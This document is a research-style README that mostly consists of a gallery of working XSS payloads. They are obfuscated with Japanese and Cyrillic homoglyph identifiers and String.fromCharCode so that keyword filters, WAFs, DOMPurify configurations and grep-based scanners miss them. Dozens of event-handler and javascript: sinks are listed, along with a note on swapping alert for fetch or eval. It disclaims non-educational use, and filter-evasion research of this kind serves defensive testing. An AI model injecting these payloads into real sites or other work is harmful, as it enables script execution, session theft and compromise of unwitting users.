<div align="center">

# 変数 · Unicode-Obfuscated XSS Payloads

**Non-ASCII identifiers + `String.fromCharCode` + `window[…]` — bypass naive keyword filters, WAFs, and grep-based DOM scanners.**

![status](https://img.shields.io/badge/status-research-6f42c1?style=flat-square)
![topic](https://img.shields.io/badge/topic-XSS-e11d48?style=flat-square)
![encoding](https://img.shields.io/badge/encoding-Unicode-0ea5e9?style=flat-square)
![purpose](https://img.shields.io/badge/purpose-educational-16a34a?style=flat-square)

</div>

---

## Idea

The literal string `alert` never appears in the payload. Three tricks stacked:

1. **Non-ASCII identifier** — `変数` (Japanese "variable") or Cyrillic look-alikes like `АЬс` are valid ECMAScript identifiers. Filters searching for `alert`, `eval`, `Function` find nothing.
2. **`String.fromCharCode(97,108,101,114,116)`** — builds `"alert"` at runtime from char codes. Signature-based regex loses.
3. **`window[変数](1)`** — bracket-notation invocation. No `.alert`, no `alert(` token.

```js
変数 = String.fromCharCode(97,108,101,114,116); // "alert"
window[変数](1);                                 // alert(1)
```

Same primitive, arbitrary sink. Swap `alert` for `fetch`, `eval`, `open`, `Function`.

### Bonus: Cyrillic homoglyph identifier

```js
let АЬс = String.fromCharCode(97,108,101,114,116);
window[АЬс](1);
```

`А` (U+0410), `Ь` (U+042C), `с` (U+0441) — visually reads `Abc`, is not.

---

## Payload Gallery

<details open>
<summary><b>Image tags</b></summary>

```html
<img src=x onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<img src=x onloadstart="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>Body / document</b></summary>

```html
<body onpageshow="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<body onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" autofocus>
```
</details>

<details>
<summary><b>Form elements — fire without user interaction</b></summary>

```html
<input autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<select autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"><option>x</option></select>
<textarea autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></textarea>
<keygen autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>Details / summary</b></summary>

```html
<details open ontoggle="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></details>
<details ontoggle="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" open><summary>x</summary></details>
```
</details>

<details>
<summary><b>Media</b></summary>

```html
<video><source onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></video>
<audio src=x onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<video poster=x onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>Iframe / object / embed</b></summary>

```html
<iframe src="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></iframe>
<iframe onload="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></iframe>
<object data="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></object>
```
</details>

<details>
<summary><b>Table / structural</b></summary>

```html
<table background="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<marquee onstart="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">x</marquee>
<marquee onfinish="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" loop=1>x</marquee>
```
</details>

<details>
<summary><b>Style / animation</b></summary>

```html
<div style="animation-name:x" onanimationstart="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">x</div>
<style>@keyframes x{}</style><div style="animation:x 1s" onanimationend="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">x</div>
```
</details>

<details>
<summary><b>SVG family</b></summary>

```html
<svg><animate onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" attributeName=x dur=1s></svg>
<svg><set onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" attributeName=x to=1></svg>
<svg><animateMotion onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" dur=1s></svg>
<svg><discard onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></svg>
```
</details>

<details>
<summary><b>Meta refresh</b></summary>

```html
<meta http-equiv="refresh" content="0;url=javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>Dialog</b></summary>

```html
<dialog open onclose="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></dialog>
```
</details>

<details>
<summary><b>MathML (often skipped by sanitizers)</b></summary>

```html
<math href="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"><maction actiontype="statusline#">click</maction></math>
```
</details>

---

## Why filters miss it

| Filter type | Looks for | Payload contains |
|---|---|---|
| Keyword regex | `alert`, `eval`, `prompt` | `変数`, char codes, `window[…]` |
| Attribute allowlist | `on*` handlers | often permits `onfocus`, `ontoggle`, `onbegin` |
| DOMPurify legacy configs | script tags, `javascript:` in `href` | MathML `href`, SVG `discard`, meta refresh |
| Grep-based SAST | ASCII identifier scans | non-ASCII Unicode identifier |

---

## Related identifier tricks

- Any ES-identifier Unicode range works: Katakana (`変数`), Cyrillic (`АЬс`), full-width (`ａｌｅｒｔ` — different codepoints than ASCII).
- `\u{20BB7}` (surrogate pair) style unicode escapes in JS identifiers.
- Combine with HTML entity encoding on the outer attribute layer for double-decode contexts.

---

## Credit

Inspired by [**0x03f3/php-emoji-reverse-shell**](https://github.com/0x03f3/php-emoji-reverse-shell/blob/main/emoji-reverse-shell.php) — same trick in PHP land: emoji identifiers + character-code assembly to defeat naive AV/WAF signatures.

---

## Legal

Educational / defensive research. Test only on assets you own or have written authorisation for (bug bounty scope, CTF, pentest SoW). Author disclaims responsibility for misuse.
